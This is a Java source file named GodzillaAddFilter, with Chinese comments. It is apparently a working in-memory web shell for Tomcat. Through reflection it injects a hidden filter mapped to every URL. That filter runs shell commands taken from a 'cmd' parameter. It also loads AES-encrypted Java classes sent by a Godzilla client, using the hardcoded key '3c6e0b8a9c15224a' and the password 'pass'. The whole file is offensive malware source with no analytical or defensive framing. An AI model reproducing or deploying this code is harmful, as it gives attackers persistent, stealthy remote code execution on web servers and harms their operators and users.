import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Scanner;
import java.io.InputStream;
// tomcat89
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

public class GodzillaAddFilter extends ClassLoader implements Filter {

    static{
        try{
            final String name = "AutoAddFilter";
            final String urlPattern = "/*";
            // 获取 standardContext
            /* org.apache.catalina.core.StandardContext容器类负责存储整个Web应用程序的数据和对象，并加载了web.xml中配置
               的多个Servlet、Filter对象以及它们的映射关系。*/
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null){
                Filter filter = new GodzillaAddFilter();

                // 生成 FilterDef
                // filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应FilterDef的对象的键值对
                // FilterDef 对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                // 设置 FilterMap
                // 使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了,其他中间件应该也是类似的
                // filterMaps 中的FilterMap则记录了不同filter与UrlPattern的映射关系
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                //设置 FilterConfig
                //在ApplicationFilterConfig对象中则存储了Filter实例以及该实例在web.xml中的注册信息
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
                filterConfigs.put(name,filterConfig);
            }
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }
    public GodzillaAddFilter() {}



    public void init(FilterConfig config) throws ServletException {
        System.out.println("GodzillaAddFilter Start ......");
    }

    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        try {
            System.out.println("Do Filter ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            String Pwd = "pass";
            String xc = "3c6e0b8a9c15224a";
            String md5 = md5(Pwd + xc);
            byte[] data = base64Decode(request.getParameter(Pwd));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new GodzillaAddFilter(getClass().getClassLoader())).Q(data));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class)session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(data);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
            }


        }catch (Exception e){
            e.printStackTrace();
        }
        chain.doFilter(servletRequest, servletResponse);
    }


    public GodzillaAddFilter(ClassLoader z) {
        super(z);
    }

    public Class Q(byte[] cb) {
        return defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        String xc = "3c6e0b8a9c15224a";
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception exception) {}
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }
}
